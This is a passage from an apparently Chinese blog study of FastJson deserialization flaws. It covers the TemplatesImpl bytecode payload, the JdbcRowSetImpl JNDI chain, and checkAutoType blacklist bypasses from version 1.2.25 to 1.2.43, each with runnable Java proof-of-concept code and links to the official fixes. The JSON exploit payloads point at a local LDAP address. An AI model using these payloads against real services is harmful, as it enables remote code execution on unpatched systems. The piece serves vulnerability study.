[\&quot;yv66vgAAADQAHAEABFRlc3QHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABBqYXZhL2xhbmcvU3lzdGVtBwAMAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DAAOAA8JAA0AEAgAAQEAE2phdmEvaW8vUHJpbnRTdHJlYW0HABMBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABQAFwEABjxpbml0PgwAGQAKCgAIABoAIQACAAgAAAAAAAIACAAJAAoAAQALAAAAFQACAAAAAAAJsgAREhK2ABixAAAAAAABABkACgABAAsAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;name\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="jdbcrowsetimpl">JdbcRowSetImpl</h3>
<h4 id="分析-1">分析</h4>
<p>这是一个 <strong>JNDI</strong> 注入链，对于 <strong>JNDI</strong>
注入来说，关键点在于 <strong>javax.naming.InitialContext#lookup</strong>
参数可控。</p>
<p><strong>connect</strong> 方法调用了 <strong>lookup</strong>，参数是
<strong>dataSourceName</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JdbcRowSetImpl (com.sun.rowset)</span></span><br><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查找引用，发现 <strong>setAutoCommit</strong>
中存在调用关系，且该方法符合 <strong>Setter</strong> 方法命名规范。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230706093002327.png" /></p>
<p><strong>setAutoCommit</strong> 方法在 <strong>conn</strong>
为空时，调用 <strong>connect</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JdbcRowSetImpl (com.sun.rowset)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结-1">总结</h4>
<p><strong>dataSourceName</strong> 为 <strong>JNDI</strong>
注入地址，<strong>autoCommit</strong> 给一个值触发
<strong>setAutoCommit</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="例子-1">例子</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复">修复</h3>
<p>官方在 <strong>1.2.25</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5?diff=split">修复</a>，引入了
<strong>checkAutoType</strong> 机制，默认情况下
<strong>autoTypeSupport</strong> 关闭，不能直接反序列化任意类，而开启
<strong>AutoType</strong>
后，有内置黑名单来实现反序列化类的过滤，同时<strong>FastJson</strong>
也提供了添加黑名单的接口。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_d52085ef54b32dfd963186e583cbcdfff5d101b5_diff=split.png" /></p>
<h2 id="section-1">1.2.25</h2>
<h3 id="简介-1">简介</h3>
<p><strong>1.2.25 &lt;= FastJson &lt;= 1.2.41</strong> 均生效。</p>
<p>引入了 <strong>checkAutoType</strong>
机制，默认关闭，使用特殊类名绕过，需要开启
<strong>AutoTypeSupport</strong> 和
<strong>SupportNonPublicField</strong>。</p>
<h3 id="分析-2">分析</h3>
<p>若开启了
<strong>autoType</strong>，先判断类名是否在白名单中，如果在，就使用
<strong>TypeUtils.loadClass</strong>
加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
<p>若未开启
<strong>autoType</strong>，则是先使用黑名单匹配，再使用白名单匹配和加载。如果反序列化的类和黑白名单都未匹配时，只有开启了
<strong>autoType</strong> 或者 <strong>expectClass</strong>
不为空也就是指定了 <strong>Class</strong> 对象时才会调用
<strong>TypeUtils.loadClass</strong> 加载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>loadClass</strong>
方法在加载目标类之前，为了兼容带有描述符的类名，在第 <strong>14</strong>
行 和 第 <strong>19</strong> 行使用了递归调用来处理描述符中的
<strong>[、L、;</strong> 字符。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TypeUtils (com.alibaba.fastjson.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此就在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。</p>
<h3 id="总结-2">总结</h3>
<p>开启 <strong>autoType</strong> 的时候，可以在类名的首尾加上
<strong>L</strong> 和 <strong>;</strong> 来绕过。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-2">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-1">修复</h3>
<p>官方在 <strong>1.2.42</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf">修复</a>，将黑白名单换成了哈希值，并使用删掉了类名头尾的
<strong>L</strong> 和 <strong>;</strong> 。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_e701faa2da7cff6d94394061bbff06a166c2aaaf.png" /></p>
<h2 id="section-2">1.2.42</h2>
<h3 id="简介-2">简介</h3>
<p><strong>1.2.25 &lt;= FastJson &lt;= 1.2.42</strong> 均生效。</p>
<p>黑白名单换成了哈希，使用双写 <strong>L</strong> 和 <strong>;</strong>
绕过，需要开启 <strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-3">分析</h3>
<p>虽然将黑白名单换成了哈希值，但是很遗憾，<a
href="https://github.com/LeadroyaL/fastjson-blacklist">可以碰撞</a>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line">&#123;</span><br><span class="line">    denyHashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;</span><br><span class="line">            -<span class="number">8720046426850100497L</span>,</span><br><span class="line">            -<span class="number">8109300701639721088L</span>,</span><br><span class="line">            -<span class="number">7966123100503199569L</span>,</span><br><span class="line">            -<span class="number">7766605818834748097L</span>,</span><br><span class="line">            -<span class="number">6835437086156813536L</span>,</span><br><span class="line">            -<span class="number">4837536971810737970L</span>,</span><br><span class="line">            -<span class="number">4082057040235125754L</span>,</span><br><span class="line">            -<span class="number">2364987994247679115L</span>,</span><br><span class="line">            -<span class="number">1872417015366588117L</span>,</span><br><span class="line">            -<span class="number">254670111376247151L</span>,</span><br><span class="line">            -<span class="number">190281065685395680L</span>,</span><br><span class="line">            <span class="number">33238344207745342L</span>,</span><br><span class="line">            <span class="number">313864100207897507L</span>,</span><br><span class="line">            <span class="number">1203232727967308606L</span>,</span><br><span class="line">            <span class="number">1502845958873959152L</span>,</span><br><span class="line">            <span class="number">3547627781654598988L</span>,</span><br><span class="line">            <span class="number">3730752432285826863L</span>,</span><br><span class="line">            <span class="number">3794316665763266033L</span>,</span><br><span class="line">            <span class="number">4147696707147271408L</span>,</span><br><span class="line">            <span class="number">5347909877633654828L</span>,</span><br><span class="line">            <span class="number">5450448828334921485L</span>,</span><br><span class="line">            <span class="number">5751393439502795295L</span>,</span><br><span class="line">            <span class="number">5944107969236155580L</span>,</span><br><span class="line">            <span class="number">6742705432718011780L</span>,</span><br><span class="line">            <span class="number">7179336928365889465L</span>,</span><br><span class="line">            <span class="number">7442624256860549330L</span>,</span><br><span class="line">            <span class="number">8838294710098435315L</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span>[] hashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[AUTO_TYPE_ACCEPT_LIST.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; AUTO_TYPE_ACCEPT_LIST.length; i++) &#123;</span><br><span class="line">        hashCodes[i] = TypeUtils.fnv1a_64(AUTO_TYPE_ACCEPT_LIST[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(hashCodes);</span><br><span class="line">    acceptHashCodes = hashCodes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此外在 <strong>checkAutoType</strong> 中对 <strong>1.2.25</strong>
的绕过做的修复也仅是删掉头尾的 <strong>L</strong> 和
<strong>;</strong>，那么绕过很简单，双写即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-3">总结</h3>
<p><strong>Payload</strong> 如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-3">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-2">修复</h3>
<p>官方在 <strong>1.2.43</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/f92e43095031935a2f8086f2de8831f45c3a34e5">修复</a>，<strong>Ban</strong>
了 <strong>LL</strong> 开头。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_f92e43095031935a2f8086f2de8831f45c3a34e5.png" /></p>
<h2 id="section-3">1.2.43</h2>
<h3 id="简介-3">简介</h3>
<p><strong>1.2.25 &lt;= FastJson &lt;= 1.2.43</strong> 均生效。</p>
<p>使用 <strong>[</strong> 绕过，需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-4">分析</h3>
<p>修复方案是判断开头为 <strong>LL</strong> 的时候报错。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是没有关系，之前提到的 <strong>[</strong>
绕过还没用，添上一个看看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给了一个报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 48, json : &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;[com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:14514/test&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:675)</span><br></pre></td></tr></table></figure>
<p>跟进报错点查看，发现第 <strong>9</strong> 行处需要一个
<strong>[</strong> 读入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parseArray</span><span class="params">(Type type, Collection array, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">token</span> <span class="operator">=</span> lexer.token();</span><br><span class="line">    <span class="keyword">if</span> (token == JSONToken.SET || token == JSONToken.TREE_SET) &#123;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">        token = lexer.token();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (token != JSONToken.LBRACKET) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;exepct &#x27;[&#x27;, but &quot;</span> + JSONToken.name(token) + <span class="string">&quot;, &quot;</span> + lexer.info());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此改进。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 54, fastjson-version 1.2.43</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)</span><br></pre></td></tr></table></figure>
<p>跟进报错点查看，发现第 <strong>9</strong> 行处需要一个
<strong>{</strong> 读入。</p>
